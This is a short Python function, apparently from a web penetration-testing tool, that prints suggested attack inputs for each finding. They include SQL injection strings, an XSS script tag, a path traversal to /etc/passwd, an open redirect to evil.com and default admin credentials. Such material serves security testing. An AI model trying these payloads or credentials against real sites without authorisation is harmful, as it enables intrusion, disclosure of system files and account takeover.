def suggest_payloads(findings):
    print("\n[+] Generating payload suggestions...\n")

    payloads = {
        "SQLi": ["' OR '1'='1", "' OR 1=1 --"],
        "XSS": ["<script>alert(1)</script>"],
        "Path Traversal": ["../../../../etc/passwd"],
        "Open Redirect": ["https://evil.com"]
    }

    for vuln_type, url in findings:
        print(f"\nTarget: {url}")

        if "SQLi" in vuln_type or "IDOR" in vuln_type:
            print("Try SQLi:")
            for p in payloads["SQLi"]:
                print(f"  {p}")

        elif "XSS" in vuln_type:
            print("Try XSS:")
            for p in payloads["XSS"]:
                print(f"  {p}")

        elif "Path Traversal" in vuln_type:
            print("Try:")
            for p in payloads["Path Traversal"]:
                print(f"  {p}")

        elif "Redirect" in vuln_type:
            print("Try:")
            for p in payloads["Open Redirect"]:
                print(f"  {p}")

        elif "admin" in url.lower():
            print("Try:")
            print("  Default creds: admin:admin")
            print("  admin:password")
            print("  test:test")
